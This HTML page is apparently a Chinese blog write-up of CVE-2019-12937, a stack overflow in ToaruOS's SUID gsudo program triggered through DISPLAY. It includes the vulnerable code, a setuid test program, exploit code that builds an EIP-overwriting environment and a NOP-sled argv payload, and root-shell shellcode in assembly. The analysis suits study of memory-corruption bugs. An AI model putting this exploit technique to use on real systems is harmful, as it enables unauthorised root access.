@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>ToaruOS 提权漏洞分析 | Hello</title>
+    <meta name="description" content="1">
+    
+    
+    <link rel="preload" href="/assets/css/0.styles.153793e6.css" as="style"><link rel="preload" href="/assets/js/app.fb63a1b9.js" as="script"><link rel="preload" href="/assets/js/8.8932bce4.js" as="script"><link rel="prefetch" href="/assets/js/10.6aae25a8.js"><link rel="prefetch" href="/assets/js/11.e5a6ecb1.js"><link rel="prefetch" href="/assets/js/12.e6734d6c.js"><link rel="prefetch" href="/assets/js/13.c45be31f.js"><link rel="prefetch" href="/assets/js/14.7fe2edb8.js"><link rel="prefetch" href="/assets/js/15.7d96271b.js"><link rel="prefetch" href="/assets/js/16.d5c5556b.js"><link rel="prefetch" href="/assets/js/17.1a634ded.js"><link rel="prefetch" href="/assets/js/18.e6787f4e.js"><link rel="prefetch" href="/assets/js/19.a31276f8.js"><link rel="prefetch" href="/assets/js/2.6cf84733.js"><link rel="prefetch" href="/assets/js/20.f1ebd130.js"><link rel="prefetch" href="/assets/js/21.9fd25a7d.js"><link rel="prefetch" href="/assets/js/22.7ec64c15.js"><link rel="prefetch" href="/assets/js/23.a0a7d0ea.js"><link rel="prefetch" href="/assets/js/24.c17f3010.js"><link rel="prefetch" href="/assets/js/25.9bbf45e5.js"><link rel="prefetch" href="/assets/js/26.4f930016.js"><link rel="prefetch" href="/assets/js/27.b6d66343.js"><link rel="prefetch" href="/assets/js/28.ded43c8f.js"><link rel="prefetch" href="/assets/js/29.35b25580.js"><link rel="prefetch" href="/assets/js/3.88ebc755.js"><link rel="prefetch" href="/assets/js/30.a0b7fe3b.js"><link rel="prefetch" href="/assets/js/31.89d75be7.js"><link rel="prefetch" href="/assets/js/32.d7c054e6.js"><link rel="prefetch" href="/assets/js/33.9a5f3e99.js"><link rel="prefetch" href="/assets/js/34.ee5cfb6f.js"><link rel="prefetch" href="/assets/js/35.2054ab64.js"><link rel="prefetch" href="/assets/js/36.73bb48c1.js"><link rel="prefetch" href="/assets/js/37.5a1d6d20.js"><link rel="prefetch" href="/assets/js/38.c7d42097.js"><link rel="prefetch" href="/assets/js/39.fd864930.js"><link rel="prefetch" href="/assets/js/4.dc8e7db2.js"><link rel="prefetch" href="/assets/js/40.6c289e11.js"><link rel="prefetch" href="/assets/js/41.0ed23031.js"><link rel="prefetch" href="/assets/js/42.10b887da.js"><link rel="prefetch" href="/assets/js/43.d348e521.js"><link rel="prefetch" href="/assets/js/44.f98660b8.js"><link rel="prefetch" href="/assets/js/45.a141b3d0.js"><link rel="prefetch" href="/assets/js/46.3a3b1b86.js"><link rel="prefetch" href="/assets/js/47.d2f1996d.js"><link rel="prefetch" href="/assets/js/48.0bd12b2f.js"><link rel="prefetch" href="/assets/js/5.6adfd92b.js"><link rel="prefetch" href="/assets/js/6.f9bcea16.js"><link rel="prefetch" href="/assets/js/7.ad2cffde.js"><link rel="prefetch" href="/assets/js/9.892cc635.js">
+    <link rel="stylesheet" href="/assets/css/0.styles.153793e6.css">
+  </head>
+  <body>
+    <div id="app" data-server-rendered="true"><div class="page-main"><div class="component-nav-menu"><div class="placeholder"></div> <div class="search-wrapper"><div aria-haspopup="listbox" role="combobox" aria-owns="el-autocomplete-6282" class="el-autocomplete"><div class="el-input el-input--prefix"><!----><input type="text" autocomplete="off" valueKey="title" placeholder="请输入内容" fetchSuggestions="function () { [native code] }" triggerOnFocus="true" debounce="300" placement="bottom-start" popperAppendToBody="true" background-color="#eee" class="el-input__inner"><span class="el-input__prefix"><i class="el-input__icon el-icon-search"></i></span><!----><!----><!----></div><div role="region" class="el-autocomplete-suggestion el-popper" style="width:;display:none;"><div class="el-scrollbar"><div class="el-autocomplete-suggestion__wrap el-scrollbar__wrap el-scrollbar__wrap--hidden-default"><ul class="el-scrollbar__view el-autocomplete-suggestion__list"></ul></div><div class="el-scrollbar__bar is-horizontal"><div class="el-scrollbar__thumb" style="width:0;transform:translateX(0%);ms-transform:translateX(0%);webkit-transform:translateX(0%);"></div></div><div class="el-scrollbar__bar is-vertical"><div class="el-scrollbar__thumb" style="height:0;transform:translateY(0%);ms-transform:translateY(0%);webkit-transform:translateY(0%);"></div></div></div></div></div></div> <ul role="menubar" class="el-menu--horizontal el-menu" style="background-color:;"><li role="menuitem" tabindex="-1" class="el-menu-item" style="color:;border-bottom-color:transparent;background-color:;">
+        Home
+      </li><li role="menuitem" tabindex="-1" class="el-menu-item is-active" style="color:;border-bottom-color:;background-color:;">
+        Blog
+      </li><li role="menuitem" tabindex="-1" class="el-menu-item" style="color:;border-bottom-color:transparent;background-color:;">
+        TimeLine
+      </li><li role="menuitem" tabindex="-1" class="el-menu-item" style="color:;border-bottom-color:transparent;background-color:;">
+        Github
+      </li><li role="menuitem" tabindex="-1" class="el-menu-item" style="color:;border-bottom-color:transparent;background-color:;">
+        About
+      </li></ul></div> <div class="page-container"><div class="component-page"><div class="page-content"><!----> <div class="content custom"><h2 id="cve-2019-12937-toaruos-提权漏洞分析"><a href="#cve-2019-12937-toaruos-提权漏洞分析" aria-hidden="true" class="header-anchor">#</a> CVE-2019-12937 ToaruOS 提权漏洞分析</h2> <p>ToaruOS是一套使用C语言编写的开源计算机操作系统，是一个由伊利诺伊大学计算机科学本科生开发的业余爱好操作系统。ToAruOS可在POSIX和x86架构上运行。ToAruOS的主要功能包括对进程和线程的支持、ELF二进制的支持、运行时加载模块、管道（Pipe）和各种类型的终端设备（TTY）的支持、虚拟文件系统的支持、EXT2文件系统的支持、信号量支持等。</p> <p>ToaruOS 1.10.9及之前版本中的gsudo的apps/gsudo.c文件存在缓冲区溢出漏洞。攻击者可借助DISPLAY环境变量利用该漏洞将权限提升至root。</p> <h2 id="漏洞触发位置"><a href="#漏洞触发位置" aria-hidden="true" class="header-anchor">#</a> 漏洞触发位置</h2> <p>在pex_connect函数使用sprintf拼接字符串，但是没有判断参数target的长度，当target太长时造成了栈溢出。</p> <div class="language- extra-class"><pre class="language-text"><code>FILE * pex_connect(char * target) {
+	char tmp[100];
+	sprintf(tmp, &quot;/dev/pex/%s&quot;, target);
+	FILE * out = fopen(tmp, &quot;r+&quot;);
+	if (out) {
+		setbuf(out, NULL);
+	}
+	return out;
+}
+</code></pre></div><p>其中参数target是环境变量DISPLAY的值。</p> <div class="language- extra-class"><pre class="language-text"><code>yutani_t * yutani_init(void) {
+	char * server_name = getenv(&quot;DISPLAY&quot;);
+	if (!server_name) {
+		server_name = &quot;compositor&quot;;
+	}
+	FILE * c = pex_connect(server_name);
+
+	if (!c) {
+		return NULL; /* Connection failed. */
+	}
+    ......
+    ......
+}
+</code></pre></div><p>在gsudo程序调用了yutani_init 函数。</p> <div class="language- extra-class"><pre class="language-text"><code>int main(int argc, char ** argv) {
+
+        if (argc &lt; 2) {
+                return 1;
+        }
+
+        yctx = yutani_init();
+	....
+	....
+}
+</code></pre></div><p>gsudo是一个拥有SUID权限的程序，所以gsudo执行时的权限是root，可以利用上面的溢出来提权。</p> <h2 id="suid"><a href="#suid" aria-hidden="true" class="header-anchor">#</a> SUID</h2> <p>SUID程序会创建s与t权限，是为了让一般用户在执行某些程序的时候，能够暂时具有该程序拥有者的权限。</p> <p>下面测试一下SUID程序执行的过程。</p> <div class="language- extra-class"><pre class="language-text"><code>#include &lt;stdio.h&gt;
+void main()
+{
+        int res;
+        res = setuid(0);
+        printf(&quot;%d\n&quot;, res);
+        system(&quot;/bin/sh&quot;);
+}
+</code></pre></div><p>setuid函数用来设置当前用户的身份，当参数为0，设置当前进程为root。在调用setuid之后，执行shell程序，观察当前用户。</p> <div class="language- extra-class"><pre class="language-text"><code>test@ubuntu:~/test$ gcc -o setid setid.c  -w
+test@ubuntu:~/test$ ./setid
+-1
+$ id
+uid=1000(test) gid=1000(test) groups=1000(test),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)
+$ exit
+test@ubuntu:~/test$ sudo chown root  setid
+test@ubuntu:~/test$ sudo chmod u+s ./setid
+test@ubuntu:~/test$ ./setid
+0
+# id
+uid=0(root) gid=1000(test) groups=1000(test),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)
+# exit
+test@ubuntu:~/test$ ls -all ./setid
+-rwsrwxr-x 1 root test 8392 Jul  7 19:57 ./setid
+</code></pre></div><p>在ToaruOS中，操作系统启动完成后，所有程序都通过执行fork到exec_elf加载，程序的权限是父进程的权限。当遇到程序具有setuid权限，设置进程权限为当前文件拥有者权限。下图为ToaruOS源码中设置SUID程序权限的操作。</p> <p><img src="/assets/img/toaruos-suid.1eaa35c0.png" alt="avatar"></p> <h2 id="漏洞利用"><a href="#漏洞利用" aria-hidden="true" class="header-anchor">#</a> 漏洞利用</h2> <p>此次溢出的程序发生在一个拥有SUID权限的程序，所以利用栈溢出可以进行提权操作。</p> <p>ToaruOS中没有栈随机、堆随机、栈不可执行等等，这些保护机制，利用起来相当简单，但是也没有gdb一些调试工具，还是要费点心思。</p> <p>通过栈溢出漏洞控制eip到我们的提权payload地址。栈上可以执行代码，栈地址也是固定的，我们通过argv变量把payload放到栈上。argv的地址直接printf(&quot;%x\n&quot;, argv) 打印出来。</p> <p><img src="/assets/img/toaruos-argv.9dc0b972.png" alt="avatar"></p> <p>设置环境变量的值，控制eip值到argv地址，argv地址不能出现\x00字符，通过填充Nop指令绕过。</p> <div class="language- extra-class"><pre class="language-text"><code>        #define EIP          &quot;\x0c\xc0\x01\x3f&quot;
+        char vector[8192]   = &quot;DISPLAY=AAA&quot;;
+        char * const env[3] = { &quot;aa&quot;, vector, NULL };
+        for (unsigned int i = 0; i &lt; 26; i++)
+                strcat(vector, EIP);
+
+</code></pre></div><p>payload通过arg传递</p> <div class="language- extra-class"><pre class="language-text"><code>        char payload[85536];
+        char * const arg[3] = { payload, &quot;ls&quot;, NULL };
+
+        memset(payload, '\x90', sizeof(payload) - shellcode_length - 1);
+        payload[sizeof(payload) - shellcode_length - 1] = 0;
+        strcat(payload, shellcode);
+</code></pre></div><p>执行gsudo</p> <div class="language- extra-class"><pre class="language-text"><code>execve(&quot;/bin/gsudo&quot;, arg, env);
+</code></pre></div><h2 id="payload"><a href="#payload" aria-hidden="true" class="header-anchor">#</a> payload</h2> <p>在payload 首先执行setuid(0)设置当前进程权限，然后执行system(/bin/shh)返回shell。toaruOS通过int 0x7f调用系统函数，在syscall_nums.h中有系统调用号，setuid对应24，system对应7。</p> <div class="language- extra-class"><pre class="language-text"><code>    xor eax, eax
+    add al, 24
+    xor ebx, ebx
+    int 0x7f
+    jmp short end
+start:
+    pop ebx
+    xor eax, eax
+    mov [ebx+7], al
+    mov [ebx+8], ebx
+    mov [ebx+12], eax
+    add al, 7
+    lea ecx, [ebx+8]
+    lea edx, [ebx+12]
+    int 0x7f
+    xor eax, eax
+    int 0x7f
+end:
+    call start
+db &quot;/bin/shh&quot;
+db &quot;XXXXXXXX&quot;
+</code></pre></div><p><img src="/assets/img/toaruos-shell.9f8c3354.png" alt="avatar"></p></div></div></div></div></div></div>
+    <script src="/assets/js/app.fb63a1b9.js" defer></script><script src="/assets/js/8.8932bce4.js" defer></script>
+  </body>
+</html>
